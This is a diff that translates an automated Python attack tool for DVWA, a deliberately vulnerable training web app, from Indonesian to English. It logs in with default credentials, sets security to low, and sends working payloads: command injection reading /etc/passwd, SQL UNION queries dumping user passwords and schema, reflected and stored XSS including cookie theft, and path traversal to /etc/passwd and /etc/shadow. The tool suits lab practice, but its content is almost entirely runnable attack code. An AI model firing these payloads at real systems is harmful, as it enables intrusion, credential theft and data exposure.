@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
 DVWA Security Tester
-Penulis : resapaulusmiki@gmail.com
-Versi   : 1.0
-Deskripsi: Tool pengujian keamanan otomatis untuk DVWA (Damn Vulnerable Web Application).
-           Hanya digunakan pada sistem milik sendiri atau dengan izin tertulis.
+Author  : resapaulusmiki@gmail.com
+Version : 1.0
+Description: Automated security testing tool for DVWA (Damn Vulnerable Web Application).
+             For authorized use only — only run against systems you own or have permission to test.
 """
 
 import sys
@@ -21,57 +21,57 @@ except Exception:
     pass
 
 # ---------------------------------------------
-#  Konfigurasi default
+#  Default config
 # ---------------------------------------------
-DEFAULT_USER     = "admin"
-DEFAULT_PASS     = "password"
-DEFAULT_TIMEOUT  = 15
+DEFAULT_USER    = "admin"
+DEFAULT_PASS    = "password"
+DEFAULT_TIMEOUT = 15
 
-WARNA = {
-    "hijau"  : "\033[92m",
-    "merah"  : "\033[91m",
-    "kuning" : "\033[93m",
-    "biru"   : "\033[94m",
+COLORS = {
+    "green"  : "\033[92m",
+    "red"    : "\033[91m",
+    "yellow" : "\033[93m",
+    "blue"   : "\033[94m",
     "reset"  : "\033[0m",
-    "tebal"  : "\033[1m",
+    "bold"   : "\033[1m",
 }
 
-def c(warna, teks):
-    """Warnai teks di terminal."""
-    return f"{WARNA.get(warna,'')}{teks}{WARNA['reset']}"
+def c(color, text):
+    """Colorize terminal output."""
+    return f"{COLORS.get(color,'')}{text}{COLORS['reset']}"
 
 
 # ---------------------------------------------
-#  Utilitas
+#  Utilities
 # ---------------------------------------------
-def banner_modul(judul):
-    garis = "-" * 60
-    print(f"\n{c('biru', garis)}")
-    print(f"{c('tebal', f'  [*] {judul}')}")
-    print(c('biru', garis))
+def module_banner(title):
+    line = "-" * 60
+    print(f"\n{c('blue', line)}")
+    print(f"{c('bold', f'  [*] {title}')}")
+    print(c('blue', line))
 
-def status(ok, pesan):
-    tanda = c("hijau", "[+]") if ok else c("merah", "[-]")
-    print(f"  {tanda} {pesan}")
+def status(ok, msg):
+    mark = c("green", "[+]") if ok else c("red", "[-]")
+    print(f"  {mark} {msg}")
 
-def blok(pesan):
-    print(c("kuning", f"  [!] {pesan}"))
+def warn(msg):
+    print(c("yellow", f"  [!] {msg}"))
 
-def ambil_token(sess, url):
-    """Ambil CSRF user_token dari halaman jika ada."""
+def fetch_token(sess, url):
+    """Fetch CSRF user_token from page if present."""
     try:
         r = sess.get(url, verify=False, timeout=DEFAULT_TIMEOUT)
         m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([0-9a-f]+)", r.text)
         return r, (m.group(1) if m else None)
-    except requests.exceptions.RequestException as e:
-        class Gagal:
+    except requests.exceptions.RequestException:
+        class Failed:
             text = ""
-            status_code = "GAGAL"
+            status_code = "FAILED"
             url = url
-        return Gagal(), None
+        return Failed(), None
 
-def kirim(sess, method, url, **kwargs):
-    """Wrapper permintaan HTTP dengan penanganan error."""
+def send(sess, method, url, **kwargs):
+    """HTTP request wrapper with error handling."""
     kwargs.setdefault("verify", False)
     kwargs.setdefault("timeout", DEFAULT_TIMEOUT)
     try:
@@ -79,14 +79,14 @@ def kirim(sess, method, url, **kwargs):
             return sess.get(url, **kwargs)
         return sess.post(url, **kwargs)
     except requests.exceptions.RequestException as e:
-        class Gagal:
+        class Failed:
             status_code = type(e).__name__
             text = ""
             url = url
-        return Gagal()
+        return Failed()
 
-def kutip_hasil(html, batas=800):
-    """Ambil teks dari area kode rentan atau body."""
+def extract_output(html, limit=800):
+    """Extract text from vulnerable code area or body."""
     soup = BeautifulSoup(html, "html.parser")
     area = (
         soup.find("div", class_="vulnerable_code_area") or
@@ -94,133 +94,133 @@ def kutip_hasil(html, batas=800):
         soup.body or
         soup
     )
-    teks = area.get_text("\n", strip=True) if area else ""
-    return teks[:batas]
+    text = area.get_text("\n", strip=True) if area else ""
+    return text[:limit]
 
 
 # ---------------------------------------------
-#  Modul 1 – Login & Set Security
+#  Module 1 - Login & Set Security
 # ---------------------------------------------
 def login(sess, base, user, passwd):
-    banner_modul("LOGIN")
-    r, tok = ambil_token(sess, f"{base}/login.php")
+    module_banner("LOGIN")
+    r, tok = fetch_token(sess, f"{base}/login.php")
     data = {"username": user, "password": passwd, "Login": "Login"}
     if tok:
         data["user_token"] = tok
-    r = kirim(sess, "POST", f"{base}/login.php", data=data, allow_redirects=True)
-    sukses = "logout" in r.text.lower() or "login.php" not in r.url
-    status(sukses, f"Login sebagai '{user}' → HTTP {r.status_code}")
-    if not sukses:
-        blok("Login gagal. Periksa kredensial atau URL target.")
+    r = send(sess, "POST", f"{base}/login.php", data=data, allow_redirects=True)
+    ok = "logout" in r.text.lower() or "login.php" not in r.url
+    status(ok, f"Logged in as '{user}' -> HTTP {r.status_code}")
+    if not ok:
+        warn("Login failed. Check credentials or target URL.")
         sys.exit(1)
 
 def set_security_low(sess, base):
-    r, tok = ambil_token(sess, f"{base}/security.php")
+    r, tok = fetch_token(sess, f"{base}/security.php")
     d = {"security": "low", "seclev_submit": "Submit"}
     if tok:
         d["user_token"] = tok
-    kirim(sess, "POST", f"{base}/security.php", data=d)
-    status(True, "Security level di-set ke 'low'")
+    send(sess, "POST", f"{base}/security.php", data=d)
+    status(True, "Security level set to 'low'")
 
 
 # ---------------------------------------------
-#  Modul 2 – Command Injection
+#  Module 2 - Command Injection
 # ---------------------------------------------
-def tes_command_injection(sess, base):
-    banner_modul("COMMAND INJECTION  (/vulnerabilities/exec/)")
+def test_command_injection(sess, base):
+    module_banner("COMMAND INJECTION  (/vulnerabilities/exec/)")
     url = f"{base}/vulnerabilities/exec/"
-    payload_list = [
+    payloads = [
         "127.0.0.1;id",
         "127.0.0.1;uname -a",
         "127.0.0.1;cat /etc/passwd | head -5",
         "127.0.0.1;hostname",
         "127.0.0.1;ls /var/www/html",
     ]
-    for payload in payload_list:
-        r, tok = ambil_token(sess, url)
+    for payload in payloads:
+        r, tok = fetch_token(sess, url)
         data = {"ip": payload, "Submit": "Submit"}
         if tok:
             data["user_token"] = tok
-        r = kirim(sess, "POST", url, data=data)
-        diblok = r.status_code in ("400", 400)
-        print(f"\n  {c('kuning','Payload:')} {payload}  (HTTP {r.status_code})")
-        if diblok:
-            blok("Diblok WAF/filter")
+        r = send(sess, "POST", url, data=data)
+        blocked = r.status_code in ("400", 400)
+        print(f"\n  {c('yellow','Payload:')} {payload}  (HTTP {r.status_code})")
+        if blocked:
+            warn("Blocked by WAF/filter")
         else:
-            hasil = kutip_hasil(r.text, 500)
-            if hasil:
-                print(c("hijau", "  +- Respons -----------------------"))
-                for baris in hasil.split("\n"):
-                    print(f"  | {baris}")
-                print(c("hijau", "  +---------------------------------"))
+            output = extract_output(r.text, 500)
+            if output:
+                print(c("green", "  +- Response ----------------------"))
+                for line in output.split("\n"):
+                    print(f"  | {line}")
+                print(c("green", "  +---------------------------------"))
 
 
 # ---------------------------------------------
-#  Modul 3 – SQL Injection
+#  Module 3 - SQL Injection
 # ---------------------------------------------
-def tes_sqli(sess, base):
-    banner_modul("SQL INJECTION  (/vulnerabilities/sqli/)")
+def test_sqli(sess, base):
+    module_banner("SQL INJECTION  (/vulnerabilities/sqli/)")
     url = f"{base}/vulnerabilities/sqli/"
-    payload_list = [
-        ("Error-based", "1'"),
+    payloads = [
+        ("Error-based",    "1'"),
         ("Boolean bypass", "1' OR '1'='1"),
         ("UNION dump users", "%' UNION SELECT user, password FROM users #"),
-        ("UNION dump all", "' UNION SELECT table_name, column_name FROM information_schema.columns #"),
+        ("UNION dump all",   "' UNION SELECT table_name, column_name FROM information_schema.columns #"),
     ]
-    for nama, payload in payload_list:
-        r = kirim(sess, "GET", url, params={"id": payload, "Submit": "Submit"})
-        diblok = r.status_code in ("400", 400)
-        print(f"\n  {c('kuning', nama)}: {payload}  (HTTP {r.status_code})")
-        if diblok:
-            blok("Diblok WAF/filter")
+    for name, payload in payloads:
+        r = send(sess, "GET", url, params={"id": payload, "Submit": "Submit"})
+        blocked = r.status_code in ("400", 400)
+        print(f"\n  {c('yellow', name)}: {payload}  (HTTP {r.status_code})")
+        if blocked:
+            warn("Blocked by WAF/filter")
         else:
-            hasil = kutip_hasil(r.text, 700)
-            if hasil:
-                for baris in hasil.split("\n")[:15]:
-                    print(f"    {baris}")
+            output = extract_output(r.text, 700)
+            if output:
+                for line in output.split("\n")[:15]:
+                    print(f"    {line}")
 
 
 # ---------------------------------------------
-#  Modul 4 – Cross-Site Scripting (XSS)
+#  Module 4 - Cross-Site Scripting (XSS)
 # ---------------------------------------------
-def tes_xss(sess, base):
-    banner_modul("CROSS-SITE SCRIPTING  (/vulnerabilities/xss_r/ & xss_s/)")
+def test_xss(sess, base):
+    module_banner("CROSS-SITE SCRIPTING  (/vulnerabilities/xss_r/ & xss_s/)")
 
     # Reflected XSS
-    print(f"\n  {c('kuning','Reflected XSS:')}")
+    print(f"\n  {c('yellow','Reflected XSS:')}")
     url_r = f"{base}/vulnerabilities/xss_r/"
-    payload_r = [
+    payloads_r = [
         "<script>alert(document.cookie)</script>",
         "<img src=x onerror=alert(1)>",
         '"><svg onload=alert(1)>',
     ]
-    for p in payload_r:
-        r = kirim(sess, "GET", url_r, params={"name": p})
-        terpantul = p in r.text if r.text else False
-        print(f"    {'+ RENTAN' if terpantul else 'x Terfilter'}  payload={p[:50]}")
+    for p in payloads_r:
+        r = send(sess, "GET", url_r, params={"name": p})
+        reflected = p in r.text if r.text else False
+        print(f"    {'[+ VULNERABLE]' if reflected else '[x Filtered]'}  payload={p[:50]}")
 
     # Stored XSS
-    print(f"\n  {c('kuning','Stored XSS:')}")
+    print(f"\n  {c('yellow','Stored XSS:')}")
     url_s = f"{base}/vulnerabilities/xss_s/"
-    r_page, tok = ambil_token(sess, url_s)
+    _, tok = fetch_token(sess, url_s)
     payload_s = "<script>alert('XSS_STORED')</script>"
     data = {
-        "txtName": "tester",
+        "txtName"   : "tester",
         "mtxMessage": payload_s,
-        "btnSign": "Sign Guestbook",
+        "btnSign"   : "Sign Guestbook",
     }
     if tok:
         data["user_token"] = tok
-    r = kirim(sess, "POST", url_s, data=data)
-    tersimpan = payload_s in r.text if r.text else False
-    status(tersimpan, f"Stored XSS {'BERHASIL disimpan' if tersimpan else 'diblok/di-encode'}")
+    r = send(sess, "POST", url_s, data=data)
+    stored = payload_s in r.text if r.text else False
+    status(stored, f"Stored XSS {'payload saved successfully' if stored else 'blocked/encoded'}")
 
 
 # ---------------------------------------------
-#  Modul 5 – File Inclusion (LFI/RFI)
+#  Module 5 - File Inclusion (LFI)
 # ---------------------------------------------
-def tes_file_inclusion(sess, base):
-    banner_modul("FILE INCLUSION  (/vulnerabilities/fi/)")
+def test_file_inclusion(sess, base):
+    module_banner("FILE INCLUSION  (/vulnerabilities/fi/)")
     url = f"{base}/vulnerabilities/fi/"
     paths = [
         "/etc/passwd",
@@ -230,53 +230,53 @@ def tes_file_inclusion(sess, base):
         "../../../../../../etc/shadow",
     ]
     for page in paths:
-        r = kirim(sess, "GET", url, params={"page": page})
-        bocor = any(k in r.text for k in ["root:", "Linux version", "Ubuntu", "Debian", "GNU"])
-        kode = r.status_code
-        lambang = c("hijau", "+ BOCOR") if bocor else "x Aman/Blok"
-        print(f"  [{lambang}]  {page}  (HTTP {kode})")
-        if bocor:
-            hasil = kutip_hasil(r.text, 400)
-            for baris in hasil.split("\n")[:8]:
-                print(f"      {baris}")
+        r = send(sess, "GET", url, params={"page": page})
+        leaked = any(k in r.text for k in ["root:", "Linux version", "Ubuntu", "Debian", "GNU"])
+        code = r.status_code
+        label = c("green", "+ LEAKED") if leaked else "x Safe/Blocked"
+        print(f"  [{label}]  {page}  (HTTP {code})")
+        if leaked:
+            output = extract_output(r.text, 400)
+            for line in output.split("\n")[:8]:
+                print(f"      {line}")
 
 
 # ---------------------------------------------
-#  Entri Utama
+#  Entry Point
 # ---------------------------------------------
 def main():
-    print(c("tebal", "\n" + "="*60))
-    print(c("tebal", "       DVWA Security Tester  v1.0"))
-    print(c("tebal", f"       Waktu : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"))
-    print(c("tebal", "="*60))
-    print(c("kuning", "  [!] Gunakan hanya pada sistem milik sendiri / ber-izin!\n"))
+    print(c("bold", "\n" + "="*60))
+    print(c("bold", "       DVWA Security Tester  v1.0"))
+    print(c("bold", f"       Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"))
+    print(c("bold", "="*60))
+    print(c("yellow", "  [!] Authorized use only — your own systems or with permission!\n"))
 
-    # -- Terima URL target --
+    # -- Target URL --
     if len(sys.argv) >= 2:
         base = sys.argv[1].rstrip("/")
     else:
-        base = input("  Masukkan URL target DVWA (contoh: http://127.0.0.1): ").strip().rstrip("/")
+        base = input("  Enter DVWA target URL (e.g. http://127.0.0.1): ").strip().rstrip("/")
 
-    # -- Terima kredensial --
-    user_in  = input(f"  Username [{DEFAULT_USER}]: ").strip() or DEFAULT_USER
-    pass_in  = input(f"  Password [{DEFAULT_PASS}]: ").strip() or DEFAULT_PASS
+    # -- Credentials --
+    user_in = input(f"  Username [{DEFAULT_USER}]: ").strip() or DEFAULT_USER
+    pass_in = input(f"  Password [{DEFAULT_PASS}]: ").strip() or DEFAULT_PASS
 
-    # -- Pilih modul --
+    # -- Module selection --
     print("""
-  Menu Serangan:
+  Attack Menu:
     1. Command Injection
     2. SQL Injection
     3. Cross-Site Scripting (XSS)
     4. File Inclusion (LFI)
-    5. Semua modul
-    0. Keluar
+    5. All modules
+    0. Exit
 """)
-    pilih = input("  Pilihan [5]: ").strip() or "5"
-    if pilih == "0":
-        print("  Keluar.")
+    choice = input("  Choice [5]: ").strip() or "5"
+    if choice == "0":
+        print("  Exiting.")
         sys.exit(0)
 
-    # -- Mulai sesi --
+    # -- Start session --
     sess = requests.Session()
     sess.headers["User-Agent"] = (
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
@@ -287,24 +287,24 @@ def main():
     login(sess, base, user_in, pass_in)
     set_security_low(sess, base)
 
-    modul = {
-        "1": tes_command_injection,
-        "2": tes_sqli,
-        "3": tes_xss,
-        "4": tes_file_inclusion,
+    modules = {
+        "1": test_command_injection,
+        "2": test_sqli,
+        "3": test_xss,
+        "4": test_file_inclusion,
     }
 
-    if pilih == "5":
-        for fn in modul.values():
+    if choice == "5":
+        for fn in modules.values():
             fn(sess, base)
-    elif pilih in modul:
-        modul[pilih](sess, base)
+    elif choice in modules:
+        modules[choice](sess, base)
     else:
-        blok("Pilihan tidak valid.")
+        warn("Invalid choice.")
 
-    print(f"\n{c('biru','-'*60)}")
-    print(c("hijau", "  [+] Pengujian selesai."))
-    print(c("biru", "-"*60 + "\n"))
+    print(f"\n{c('blue','-'*60)}")
+    print(c("green", "  [+] Testing complete."))
+    print(c("blue", "-"*60 + "\n"))
 
 
 if __name__ == "__main__":
